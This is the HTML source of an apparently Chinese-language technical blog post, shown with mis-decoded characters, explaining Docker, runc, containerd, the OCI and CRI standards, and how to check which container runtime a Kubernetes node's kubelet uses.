    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åœ¨<a href="../../../../2024/07/08/%E6%B5%85%E8%B0%88%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6/">ã€Šæµ…è°ˆå®¹å™¨è¿è¡Œæ—¶ã€‹</a>ä¸­ï¼Œæˆ‘ä»¬äº†è§£åˆ°ï¼šDocker å¹¶ä¸ç­‰äºå®¹å™¨ï¼Œå®ƒåªä¸è¿‡æ˜¯å®¹å™¨ç”Ÿæ€ç³»ç»Ÿä¸­ä¸€ä¸ªå¾ˆä¸é”™çš„é€‰æ‹©ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–çš„å®¹å™¨è¿è¡Œæ—¶ï¼ˆä¸‹æ–‡ç»Ÿç§°ï¼šå®¹å™¨ Runtimeï¼‰æ¥è¿è¡Œå®¹å™¨ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æ·±å…¥äº†è§£å®¹å™¨çš„ç”Ÿæ€ç³»ç»Ÿä¸­å„ä¸ªä¸åŒçš„å®¹å™¨ Runtime ä¹‹é—´çš„åŒºåˆ«ï¼Œå¦‚æœæ‚¨æ­£åœ¨è€ƒè™‘è½¬å‘ DevOpsï¼Œè¿™å°†æ˜¯ä¸€ç¯‡å¾ˆä¸é”™çš„æ–‡ç« ï½</p><h2 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01 æ¦‚è¿°"></a>0x01 æ¦‚è¿°</h2><p>å®¹å™¨çš„ç”Ÿæ€ç³»ç»Ÿç”±æ–°å…´çš„æŠ€æœ¯ã€å¤§é‡çš„æœ¯è¯­å’Œç›¸äº’ç«äº‰çš„å¤§å…¬å¸ç»„æˆã€‚è¿™äº›å…¬å¸å¶å°”ä¼šä»¥ä¼‘æˆ˜çš„æ–¹å¼åœæ­¢ç«äº‰ï¼Œå…±åŒå»ºç«‹ä¸€ä¸ªæ ‡å‡†ã€‚</p><p>è¿™äº›æ ‡å‡†æœ‰åŠ©äºæé«˜æ•´ä¸ªç”Ÿæ€ç³»ç»Ÿçš„äº’ç›¸æ“ä½œæ€§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šæˆ‘ä»¬å¯ä»¥å‡å°‘å¯¹æŸä¸ªå…¬å¸æˆ–é¡¹ç›®çš„ä¾èµ–æ€§ï¼Œåœ¨ä¸åŒçš„å¹³å°å’Œæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œå®¹å™¨ã€‚</p><p>å®¹å™¨æœ‰ä»¥ä¸‹ä¸¤å¤§æ ‡å‡†ï¼š</p><ol><li><a href="https://opencontainers.org/" title="Open Container Initiative">Open Container Initiative</a>ï¼ˆå¼€æ”¾å¼å®¹å™¨å€¡è®®ï¼ŒOCIï¼‰ï¼šä¸ºå®¹å™¨é¢å¸ƒäº†é•œåƒè§„èŒƒã€åˆ†å‘è§„èŒƒå’Œè¿è¡Œè§„èŒƒï¼›</li><li><a href="https://kubernetes.io/docs/concepts/architecture/cri/" title="Container Runtime Interface">Container Runtime Interface</a>ï¼ˆå®¹å™¨è¿è¡Œæ—¶æ¥å£ï¼ŒCRIï¼‰ï¼šå…è®¸æˆ‘ä»¬åœ¨ Kubernetes ä¸­ä½¿ç”¨ä¸åŒçš„å®¹å™¨ Runtime çš„ APIï¼›</li></ol><p>æ¥ç€ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸‹é¢è¿™å¼ å›¾ï¼Œäº†è§£äº†è§£ Dockerã€Kubernetesã€CRIã€OCIã€containerd å’Œ runc åœ¨è¿™ä¸ªç”Ÿæ€ç³»ç»Ÿä¸­æ˜¯å¦‚ä½•ç»„åˆèµ·æ¥ä½¿ç”¨çš„ã€‚</p><p><img src="/image/image_C1PZBV2I_9.png" alt="å›¾ 1ï¼šDockerã€Kubernetesã€OCIã€CRI-Oã€containerd  å’Œ runc çš„ä¹‹é—´çš„å…³ç³»" title="å›¾1ï¼šDockerã€Kubernetesã€OCIã€CRI-Oã€ containerd  å’Œ runcçš„ä¹‹é—´çš„å…³ç³»"></p><h2 id="0x02-Docker"><a href="#0x02-Docker" class="headerlink" title="0x02 Docker"></a>0x02 Docker</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥ä»‹ç»ä½¿ç”¨èŒƒå›´æœ€å¹¿çš„å®¹å™¨ Runtimeï¼šDockerã€‚Docker å…¬å¸ä¸»è¦é€šè¿‡å¼€å‘ä»¥ä¸‹ä¸¤ç§ç”¨æˆ·äº¤äº’å‹å¥½çš„å·¥å…·æ¥è®©ç”¨æˆ·åˆ›å»ºå’Œä½¿ç”¨å®¹å™¨ï¼š</p><ol><li>å¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨çš„<a href="https://www.docker.com/products/docker-desktop/" title="Docker Desktop">Docker Desktop</a> ï¼Œé€‚ç”¨äº Windowsã€Mac å’Œ Linuxï¼›</li><li>æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨çš„<a href="https://docs.docker.com/engine/install/" title="Docker Engine">Docker Engine</a>ï¼Œé€‚ç”¨äº Linuxï¼›</li></ol><p><img src="/image/image_B09mDSorN6.png" alt="å›¾ 2ï¼šDocker Engine VS Docker Desktop" title="å›¾2ï¼šDocker Engine VS Docker Desktop "></p><h3 id="2-1-Docker-Desktop"><a href="#2-1-Docker-Desktop" class="headerlink" title="2.1 Docker Desktop"></a>2.1 Docker Desktop</h3><p><strong>Docker Desktop æ˜¯ä¸€ä¸ªé€‚ç”¨äº Macã€Windows å’Œ Linux çš„ GUI ç¨‹åºï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬åœ¨è‡ªå·±çš„ç”µè„‘ä¸­å°±å¯ä»¥è½»è½»æ¾æ¾åœ°è¿è¡Œ Dockerã€‚</strong></p><p><img src="/image/image_h3yQT7yvML.png" alt="å›¾ 3ï¼šDocker Destop" title="å›¾3ï¼šDocker Destop"></p><p>Docker Desktop ä¸ä»…åŒ…æ‹¬è¿è¡Œç€ Docker å®ˆæŠ¤è¿›ç¨‹çš„ Linux è™šæ‹Ÿæœºï¼Œè¿˜åŒ…æ‹¬ Kubernetesï¼›å®ƒæœ‰ä¸€ä¸ªéå¸¸æ¼‚äº®çš„ UI ç•Œé¢æ¥å¯è§†åŒ–å®¹å™¨ï¼Œå¹¶ä¸”è¿˜æä¾›äº†ä¸€ç§éå¸¸ç®€å•çš„ç”¨äºå¯åŠ¨ Kubernetes çš„æ–¹æ³•ã€‚</p><p>è™½ç„¶è¯´ï¼Œæˆ‘ä»¬ä¸ä¸€å®šéœ€è¦ä½¿ç”¨ Docker Desktop æ¥ä½¿ç”¨å®¹å™¨ï¼Œä½†è¿™ä»ç„¶æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å…¥é—¨çš„æ–¹æ³•ã€‚ä½†å¦‚æœæˆ‘ä»¬æ˜¯åœ¨å…¬å¸çš„æœåŠ¡å™¨ä¸­ä½¿ç”¨ Docker çš„ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ¨èä½¿ç”¨ Docker Engineã€‚</p><h3 id="2-1-Docker-Engine-x20"><a href="#2-1-Docker-Engine-x20" class="headerlink" title="2.1 Docker Engine&#x20;"></a>2.1 Docker Engine&#x20;</h3><p>Docker Engine é™„å¸¦äº†ä¸€ç³»åˆ—å·¥å…·ï¼ŒåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªç”¨äºæ“ä½œå®¹å™¨çš„ CLI å·¥å…·ï¼Œå¯ä»¥è®©å¼€å‘è€…æˆ–ç³»ç»Ÿç®¡ç†å‘˜è½»æ¾åœ°æ„å»ºå¹¶è¿è¡Œå®¹å™¨ã€‚</p><p><img src="/image/image_9qZXLX0Mnw.png" alt="å›¾ 4ï¼šDocker Engine" title="å›¾4ï¼šDocker Engine"></p><p>docker å‘½ä»¤åªæ˜¯ Docker Engine ä¸­çš„ä¸€ä¸ªå°å°çš„éƒ¨åˆ†ï¼Œå®ƒå¯ä»¥å‘é€æ„å»ºé•œåƒã€æ‹‰å–é•œåƒã€åˆ›å»ºå®¹å™¨ã€å¯åŠ¨å®¹å™¨å’Œç®¡ç†å®¹å™¨ç­‰ç­‰æŒ‡ä»¤ã€‚æˆ‘ä»¬ä»ä¸‹å¾€ä¸Šçœ‹ï¼Œæ¥ç»†æ•° docker æ‰€ä½¿ç”¨çš„å·¥å…·ï¼š</p><ul><li>åº•å±‚å®¹å™¨ Runtimeï¼š<a href="https://github.com/opencontainers/runc" title="runc">runc</a> ä¸»è¦ä½¿ç”¨ Linux çš„åŸç”ŸåŠŸèƒ½æ¥åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨ã€‚å®ƒåŒ…å«ä¸€ä¸ªåä¸º <a href="https://pkg.go.dev/github.com/opencontainers/runc/libcontainer" title="Libcontainer">Libcontainer</a>çš„ç”¨äºåˆ›å»ºå®¹å™¨çš„ Go åº“ï¼Œæ˜¯ä¸€ä¸ªåº•å±‚çš„å®¹å™¨ Runtimeã€‚</li><li>é«˜å±‚å®¹å™¨ Runtimeï¼š<a href="https://containerd.io/" title="containerd">containerd</a>åœ¨åº•å±‚å®¹å™¨ Runtime ä¹‹ä¸Šï¼Œå®ƒæ·»åŠ äº†ä¸€ç³»åˆ—é¢å¤–çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šé•œåƒçš„ä¼ è¾“ã€å­˜å‚¨å’Œç½‘ç»œç­‰ï¼Œå®ƒå®Œå…¨æ”¯æŒ OCI è§„èŒƒã€‚</li><li>Docker å®ˆæŠ¤è¿›ç¨‹ï¼š<a href="https://docs.docker.com/reference/cli/dockerd/" title="Dockerd">Dockerd</a> æ˜¯ docker çš„ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼ˆå³åœ¨åå°é•¿æ—¶é—´è¿è¡Œçš„è¿›ç¨‹ï¼‰ï¼Œå®ƒæä¾›äº†æ ‡å‡†çš„ APIï¼Œå¯ä»¥ä¸å®¹å™¨ Runtime è¿›è¡Œé€šä¿¡ã€‚</li><li>Docker CLI å·¥å…·ï¼š<a href="https://github.com/docker/cli" title="Docker-cli">Docker-cli</a>æ˜¯ Docker çš„ CLI å·¥å…·ï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬ä½¿ç”¨ Docker å‘½ä»¤ä¸ Docker å®ˆæŠ¤è¿›ç¨‹äº¤äº’ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬æ— éœ€äº†è§£ä¸€äº›åº•å±‚åŸç†å°±å¯ä»¥æ§åˆ¶å®¹å™¨äº†ã€‚</li></ul><p><img src="/image/image_p1yPy0G9nW.png" alt="å›¾ 5ï¼šä½¿ç”¨ Docker è¿è¡Œå®¹å™¨æ‰€ç‰µæ¶‰åˆ°çš„å·¥å…·" title="å›¾5ï¼šä½¿ç”¨ Dockerè¿è¡Œå®¹å™¨æ‰€ç‰µæ¶‰åˆ°çš„å·¥å…·"></p><p>æ€»è€Œè¨€ä¹‹ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ Docker çš„æ—¶å€™ï¼Œè¿™äº›å·¥å…·çš„è°ƒç”¨é“¾å¦‚ä¸‹æ‰€ç¤ºï¼š</p><ol><li>é€šè¿‡ Docker CLI å·¥å…·ç»™ Docker å®ˆæŠ¤è¿›ç¨‹å‘é€æŒ‡ä»¤ï¼›</li><li>Docker å®ˆæŠ¤è¿›ç¨‹è°ƒç”¨ containerd æ¥ç®¡ç†å®¹å™¨ï¼›</li><li>containerd è°ƒç”¨ runc æ¥åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨ï¼›</li></ol><h3 id="2-3-Kubernetes-å¯ä»¥ä½¿ç”¨-Docker-å—ï¼Ÿ"><a href="#2-3-Kubernetes-å¯ä»¥ä½¿ç”¨-Docker-å—ï¼Ÿ" class="headerlink" title="2.3 Kubernetes å¯ä»¥ä½¿ç”¨ Docker å—ï¼Ÿ"></a>2.3 Kubernetes å¯ä»¥ä½¿ç”¨ Docker å—ï¼Ÿ</h3><p>æ€»æœ‰äººä¼šé—®ï¼šâ€œKubernetes ä¸­ä½¿ç”¨çš„æ˜¯å®¹å™¨ Runtime æ˜¯ Docker å—ï¼Ÿâ€ï¼Œè‹¥æ”¾åœ¨ä»¥å‰ï¼Œç­”æ¡ˆæ˜¯â€œYESâ€ï¼Œè€Œç°åœ¨æ˜¯â€œNOâ€äº†ã€‚</p><p>æœ€åˆï¼ŒKubernetes ç¡®å®æ˜¯ä½¿ç”¨ Docker Engine æ¥è¿è¡Œå®¹å™¨çš„ï¼Œä½†éšç€æ—¶é—´çš„æ¨ç§»ï¼ŒKubernetes åˆ›å»ºäº† CRI æ¥å£ï¼Œå®ƒå…è®¸ç”¨æˆ·å°†ä¸åŒçš„å®¹å™¨ Runtime æ¥å…¥å…¶ä¸­ï¼Œäºæ˜¯ Kubernetes æ¸æ¸çš„æ¼”å˜æˆäº†ä¸€ä¸ªä¸å®¹å™¨æ— å…³çš„å¹³å°äº†ã€‚</p><p>Docker Engine æ˜¯ä¸€ä¸ªæ¯” Kubernetes æ›´æ—©çš„é¡¹ç›®ï¼Œä¸”å¹¶æœªå®ç° CRIã€‚å› æ­¤ï¼Œä¸ºäº†å¼¥è¡¥æ–°ä¸–ç•Œä¸æ—§ä¸–ç•Œä¹‹é—´çš„é¸¿æ²Ÿï¼ŒKubernetes åŒ…å«äº†ä¸€ä¸ªåä¸º dockershim çš„ç»„ä»¶ï¼Œå®ƒå…è®¸ Kubernetes ä½¿ç”¨ Docker ä½œä¸ºå®¹å™¨ Runtime æ¥è¿è¡Œå®¹å™¨ã€‚<strong>ä½† Kubernetes è‡ª 1.24 ç‰ˆæœ¬å¼€å§‹ï¼Œå°±å°† dockershim ç»„ä»¶è¢«å®Œå…¨åˆ é™¤äº†ï¼Œæ‰€ä»¥ Kubernetes ä¸å†åŸç”Ÿåœ°æ”¯æŒ Docker ä½œä¸ºå®¹å™¨ Runtime äº†ã€‚</strong> å¦‚æœè¦ç»™ Kubernetes é€‰æ‹©ä¸€ä¸ªå®¹å™¨ Runtimeï¼Œé‚£ä¹ˆè¿™ä¸ªå®¹å™¨ Runtime å¿…å¾—å…¼å®¹ CRI è§„èŒƒï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹© containerdã€CRI-O ç­‰ç­‰ã€‚</p><p><img src="/image/image_4K6Q4nXhVB.png" alt="å›¾ 6ï¼šæ—©æœŸçš„ Kubernetes é€šè¿‡ dockershim ä½¿ç”¨ dockerï¼Œå¦‚ä»Šå·²å®Œå…¨ç§»é™¤ dockershim äº†" title="å›¾6ï¼šæ—©æœŸçš„Kubernetesé€šè¿‡ dockershim ä½¿ç”¨ dockerï¼Œå¦‚ä»Šå·²å®Œå…¨ç§»é™¤dockershimäº†"></p><p>åœ¨è¿™é‡Œï¼Œéœ€è¦æ¾„æ¸…çš„ä¸€ç‚¹æ˜¯ï¼š<strong>è¿™ä¸€è½¬å˜è¿™å¹¶ä¸æ„å‘³ç€ Kubernetes ä¸èƒ½è¿è¡Œ Docker æ ¼å¼çš„å®¹å™¨äº†</strong>ã€‚å› ä¸º containerd å’Œ CRI-O æ— éœ€æ‰§è¡Œ Docker å‘½ä»¤æˆ–ä½¿ç”¨ Docker å®ˆæŠ¤è¿›ç¨‹å³å¯åœ¨ Kubernetes ä¸­è¿è¡Œ Docker æ ¼å¼å’Œ OCI æ ¼å¼çš„é•œåƒã€‚</p><h2 id="0x03-OCI-å’Œ-CRI"><a href="#0x03-OCI-å’Œ-CRI" class="headerlink" title="0x03 OCI å’Œ CRI"></a>0x03 OCI å’Œ CRI</h2><p>åœ¨é˜…è¯»å‰é¢çš„å†…å®¹çš„æ—¶å€™ï¼Œå¤§å®¶ä¼šåå¤å¬åˆ° OCI å’Œ CRI ä¸¤ä¸ªæ ‡å‡†ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæ ‡å‡†å…·ä½“æ˜¯å¹²å˜›çš„å‘¢ï¼Ÿè¿™äº›æ ‡å‡†ä¸»è¦çš„ä½œç”¨åœ¨äºï¼šæˆ‘ä»¬å¯ä»¥åœ¨ä¸åŒçš„å¹³å°ä¸Šè¿è¡Œå®¹å™¨ã€‚</p><h3 id="3-1-OCI"><a href="#3-1-OCI" class="headerlink" title="3.1 OCI"></a>3.1 OCI</h3><p>ç”±äº Docker å…¬å¸åœ¨ Docker å¼€æºé¡¹ç›®çš„å‘å±•ä¸Šå§‹ç»ˆä¿æŒç€ç»å¯¹çš„æƒå¨å’Œå‘è¨€æƒï¼Œå¹¶åœ¨å¤šä¸ªåœºåˆç”¨å®é™…è¡ŒåŠ¨æŒ‘æˆ˜äº† CoreOSã€RetHatã€è°·æ­Œå’Œå¾®è½¯ç­‰ç©å®¶çš„åˆ‡èº«åˆ©ç›Šã€‚</p><p>2015 å¹´ 6 æœˆ 22 æ—¥ï¼Œç”± Dockerã€CoreOS å’Œå®¹å™¨é¢†åŸŸçš„å…¶ä»–å…¬å¸å…±åŒå®£å¸ƒï¼šDocker å…¬å¸æçŒ®å…¶å®¹å™¨æ ¼å¼ã€å®¹å™¨è¿è¡Œæ—¶å’Œ runcï¼Œäº¤ç”±ä¸€ä¸ªå®Œå…¨ä¸­ç«‹çš„åŸºé‡‘ä¼šç®¡ç†ï¼Œå¹¶ä¸”ä»¥ runc ä¸ºä¾æ®ï¼Œåˆ¶å®šä¸€å¥—åä¸º<a href="https://opencontainers.org/" title="OCI">OCI</a>ï¼ˆOpen Container Initiativeï¼Œå¼€æ”¾å®¹å™¨å€¡è®®ï¼‰çš„è§„èŒƒã€‚<strong>OCI æ˜¯æœ€æ—©ä¸ºå®¹å™¨åˆ¶å®šæ ‡å‡†çš„ç»„ç»‡ä¹‹ä¸€ï¼Œä»–ä»¬å…±åŒç»´æŠ¤å®¹å™¨çš„é•œåƒæ ‡å‡†ï¼ˆ</strong><a href="https://github.com/opencontainers/image-spec" title="image-spec"><strong>image-spec</strong></a><strong>ï¼‰ã€åˆ†å‘æ ‡å‡†ï¼ˆ</strong><a href="https://github.com/opencontainers/distribution-spec" title="distribution-spec"><strong>distribution-spec</strong></a><strong>ï¼‰å’Œè¿è¡Œæ ‡å‡†ï¼ˆ</strong><a href="https://github.com/opencontainers/runtime-spec" title="runtime-spec"><strong>runtime-spec</strong></a><strong>ï¼‰</strong>ã€‚</p><p><img src="/image/image_Mea-jK8vzd.png" alt="å›¾ 7ï¼šOCI è§„èŒƒ" title="å›¾7ï¼šOCIè§„èŒƒ"></p><p>OCI è§„èŒƒä¸»è¦æ€è€ƒçš„æ˜¯ï¼š<strong>æ ‡å‡†åŒ–å®¹å™¨æ˜¯ä»€ä¹ˆä»¥åŠå®ƒèƒ½å¤Ÿåšä»€ä¹ˆï¼Ÿ</strong> è¿™æ„å‘³ç€ï¼Œä½ å¯ä»¥ä¸ºä¸åŒçš„å¹³å°é€‰æ‹©ä¸åŒçš„å®¹å™¨ Runtimeï¼Œå³ä½¿å®ƒä»¬çš„åº•å±‚å®ç°ä¸ä¸€æ ·ï¼Œä½†åªè¦å®ƒä»¬éƒ½æ»¡è¶³ OCI è§„èŒƒï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†å®ƒä»¬ç»„åˆèµ·æ¥ä¸€èµ·ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæˆ‘ä»¬çš„ Linux ä¸»æœºé€‰æ‹©ç¬¦åˆ OCI è§„èŒƒçš„å®¹å™¨ Runtimeï¼Œç„¶åä¸º Windows ä¸»æœºé€‰æ‹©ç¬¦åˆ OCI è§„èŒƒçš„å¦å¤–ä¸€ç§å®¹å™¨ Runtimeã€‚</p><h3 id="3-2-CRI"><a href="#3-2-CRI" class="headerlink" title="3.2 CRI"></a>3.2 CRI</h3><p>æˆ‘ä»¬éœ€è¦è®¨è®ºçš„å¦å¤–ä¸€ä¸ªæ ‡å‡†å°±æ˜¯ç”± Kubernetes åˆ›å»ºçš„ CRI äº†ã€‚ç”±ä¸Šæ–‡å¾—çŸ¥ï¼ŒKubernetes åˆ›å»ºäº† CRI æ¥å£ï¼Œå…è®¸ç”¨æˆ·å°†ä¸åŒçš„å®¹å™¨ Runtime æ¥å…¥åˆ°é›†ç¾¤ä¸­ï¼Œå¯¹å®¹å™¨è¿›è¡Œæ“ä½œä¸ç®¡ç†ã€‚Kubernetes ä¸å…³å¿ƒç”¨æˆ·ä½¿ç”¨çš„æ˜¯å“ªç§å®¹å™¨ Runtimeï¼Œå®ƒåªå…³å¿ƒè‡ªå·±æ˜¯å¦å¯ä»¥å‘å®¹å™¨ Runtime å‘é€ä¸º Pod åˆ›å»ºå®¹å™¨ã€ç»ˆæ­¢å®¹å™¨ç­‰æŒ‡ä»¤ã€‚</p><p><img src="/image/image_ZArvIyjSRe.png" alt="å›¾ 8ï¼šKubernetes å®˜ç½‘ä¸Šå…³äº CRI çš„ä»‹ç»" title="å›¾8ï¼šKubernetes å®˜ç½‘ä¸Šå…³äº CRIçš„ä»‹ç»"></p><p><strong>CRI ä¸»è¦æè¿°äº† Kubernetes å¦‚ä½•ä¸ Runtime è¿›è¡Œäº¤äº’</strong>ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œåªè¦æˆ‘ä»¬æ‰€ä½¿ç”¨çš„å®¹å™¨ Runtime å®ç°äº† CRI çš„ API æ¥å£ï¼Œå®ƒå°±å¯ä»¥æŒ‰ç…§è‡ªå·±å–œæ¬¢çš„æ–¹å¼åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼Œè€Œ Kubernetes ä¹Ÿä¸ç”¨å•ç‹¬åœ°å¢åŠ å¯¹æ¯ä¸ªå®¹å™¨ Runtime çš„æ”¯æŒäº†ã€‚</p><p><img src="/image/image_bRJQi0u_go.png" alt="å›¾ 9ï¼šCRI åœ¨ Kubernetes å’Œå®¹å™¨ Runtime ä¹‹é—´çš„ä½œç”¨" title="å›¾9ï¼šCRIåœ¨Kuberneteså’Œå®¹å™¨Runtimeä¹‹é—´çš„ä½œç”¨"></p><p>å¦‚æœæˆ‘ä»¬åªæ˜¯ä¸€ä¸ªç»ˆç«¯ä½¿ç”¨å®¢æˆ·ï¼ˆä¾‹å¦‚å¼€å‘è€…ï¼‰ï¼Œæˆ‘ä»¬å¯¹å®¹å™¨ Runtime çš„é€‰æ‹©åº”è¯¥åŸºäºå®ƒä»¬æ‰€æä¾›çš„åŠŸèƒ½å’Œæ€§èƒ½ï¼Œè€Œä¸æ˜¯å®ƒä»¬ä¹‹é—´å®ç°çš„ç»†å¾®å·®åˆ«ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ˜¯å¯æ’æ‹”å¹¶ä¸”æ— ç¼æ›´æ”¹çš„ã€‚</p><p>ä½†å¦‚æœæˆ‘ä»¬é€‰æ‹©ä»ä¾›åº”å•†é‚£é‡Œè´­ä¹°æ”¯æŒæœåŠ¡ï¼ˆæ¯”å¦‚å®‰å…¨æ›´æ–°ã€é”™è¯¯ä¿®å¤ç­‰ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯¹å®¹å™¨ Runtime çš„é€‰æ‹©ä¼šå—åˆ°ä¾›åº”å•†çš„å½±å“æˆ–é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œ<a href="https://www.redhat.com/en/blog/red-hat-openshift-container-platform-4-now-defaults-cri-o-underlying-container-engine" title="Red Hat çš„ OpenShift ä½¿ç”¨ CRI-O">Red Hat çš„ OpenShift ä½¿ç”¨ CRI-O</a>ï¼Œå¹¶ä¸º CRI-O æä¾›å®˜æ–¹æ”¯æŒï¼ŒåŒ…æ‹¬å®‰å…¨æ›´æ–°å’Œé”™è¯¯ä¿®å¤ç­‰æœåŠ¡ï¼›Docker ä¸º containerd æä¾›æ”¯æŒæœåŠ¡ï¼ŒåŒ…æ‹¬å®‰å…¨æ›´æ–°ã€é”™è¯¯ä¿®å¤ç­‰ï¼Œç¡®ä¿ç”¨æˆ·åœ¨ä½¿ç”¨ containerd æ—¶èƒ½å¤Ÿå¾—åˆ°å¿…è¦çš„å¸®åŠ©ã€‚</p><p>åœ¨<a href="https://www.tutorialworks.com/kubernetes-architecture/" title="Kubernetesæ¶æ„">Kubernetes æ¶æ„</a>ä¸­ï¼Œ<code>kubelet</code>ï¼ˆåœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œçš„ä»£ç†ï¼‰è´Ÿè´£å‘å®¹å™¨ Runtime å‘é€æŒ‡ä»¤æ¥å¯åŠ¨å¹¶è¿è¡Œå®¹å™¨ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹<code>kubelet</code>çš„å‚æ•°æ¥äº†è§£æˆ‘ä»¬æ­£åœ¨ä½¿ç”¨çš„å®¹å™¨ Runtime æ˜¯ä»€ä¹ˆã€‚æˆ‘ä»¬å¯ä»¥é‡ç‚¹å…³æ³¨çš„å‚æ•°æœ‰<code>--container-runtime</code>å’Œ<code>--container-runtime-endpoint</code>ã€‚</p><p>åœ¨ kubernetes v1.30.0 ä¸­ï¼Œæˆ‘ä»¬æ— æ³•æ‰¾åˆ°<code>kubelet</code>çš„<code>container-runtime</code>å‚æ•°ï¼Œä¸”å®ƒçš„<code>--container-runtime-endpoint</code>å·²ç»è¢«å¼ƒç”¨ï¼Œæˆ‘ä»¬åªèƒ½åœ¨ config æ–‡ä»¶ä¸­æŒ‡å®š<code>container-runtime-endpoint</code>çš„å†…å®¹ï¼Œå¹¶ç”±å‚æ•°<code>--config</code>ä¼ é€’ç»™<code>kubelet</code>ã€‚</p><p><img src="/image/image_NKzdAAvDmq.png" alt="å›¾ 10:kubernetes v1.30.0 ä¸­ï¼Œkubelet å·²ç»å¼ƒç”¨ --container-runtime-endpoint å‚æ•°" title="å›¾10:kubernetes v1.30.0 ä¸­ï¼Œkubelet å·²ç»å¼ƒç”¨ --container-runtime-endpoint å‚æ•°"></p><p><img src="/image/image_s2hddJLMWd.png" alt="å›¾ 11ï¼šä½†æˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶æ¥ä¼ é€’ container-runtime-endpoint çš„å€¼" title="å›¾11ï¼šä½†æˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶æ¥ä¼ é€’ container-runtime-endpoint çš„å€¼"></p><p>å¦‚æœï¼Œæˆ‘ä»¬æƒ³è¦æŸ¥çœ‹<code>container-runtime-endpoint</code>çš„å†…å®¹ï¼Œåº”è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¾—å¼€å¯ä¸€ä¸ªä»£ç†æœåŠ¡å™¨ï¼›</p><p><img src="/image/image_4X7bXfoSWF.png" alt="å›¾ 12ï¼škubectl proxy" title="å›¾12ï¼š kubectl proxy"></p><p>ç„¶åï¼Œåœ¨ä¸€ä¸ªæ–°çš„ç»ˆç«¯é‡Œï¼Œä½¿ç”¨<code>curl</code> å¯¹ä»¥ä¸‹ API å‘èµ· GET è¯·æ±‚ï¼Œå¹¶ä½¿ç”¨<code>jq</code> æ ¼å¼åŒ–æ‰€è¿”å›çš„ json æ•°æ®ï¼ˆè®°å¾—æ ¹æ®å®é™…æƒ…å†µæ›¿æ¢<code>&lt;node-name&gt;</code>ï¼‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X GET http://127.0.0.1:8001/api/v1/nodes/&lt;node-name&gt;/proxy/configz | jq .<br></code></pre></td></tr></table></figure><p><img src="/image/image_mEUWulm1Eg.png" alt="å›¾ 13ï¼šæŸ¥çœ‹ container-runtime-endpoint çš„å€¼" title="å›¾13ï¼šæŸ¥çœ‹ container-runtime-endpoint çš„å€¼"></p><p>é€šè¿‡ä¸Šè¿°æ“ä½œï¼Œæˆ‘ä»¬éœ€è¦æ„è¯†åˆ°ï¼š<strong>å½“æˆ‘ä»¬åœ¨ç ”ç©¶ kubernetes çš„æ—¶å€™ï¼Œç‰¹åˆ«éœ€è¦å…³æ³¨å…¶ç‰ˆæœ¬ä¿¡æ¯ï¼Œå› ä¸º kubernetes åœ¨å‘å±•è¿‡ç¨‹ä¸­ï¼Œå„ç§åŠŸèƒ½å’Œå‚æ•°çš„è°ƒæ•´å’Œå¼ƒç”¨éå¸¸å¸¸è§</strong>ã€‚æŸ¥çœ‹ Kubernetes çš„å®¹å™¨ Runtime æ›´å¯é çš„æ–¹æ³•åº”è¯¥æ˜¯ä½¿ç”¨ kubectl è·å–æ›´å¤šçš„èŠ‚ç‚¹ä¿¡æ¯ï¼Œè¿™å¾€å¾€ä¹Ÿä¼šè¾“å‡ºå®¹å™¨ Runtime çš„ä¿¡æ¯ã€‚</p><p><img src="/image/image_6_gDaJxrJq.png" alt="å›¾ 14ï¼šä½¿ç”¨ kubectl get nodes -o wideï¼Œè®© kubectl è¾“å‡ºèŠ‚ç‚¹çš„ä¿¡æ¯çš„åŒæ—¶ï¼Œè¾“å‡ºå®¹å™¨ Runtime çš„ä¿¡æ¯" title="å›¾14ï¼šä½¿ç”¨ kubectl get nodes -o wideï¼Œè®©kubectlè¾“å‡ºèŠ‚ç‚¹çš„ä¿¡æ¯çš„åŒæ—¶ï¼Œè¾“å‡ºå®¹å™¨ Runtimeçš„ä¿¡æ¯ 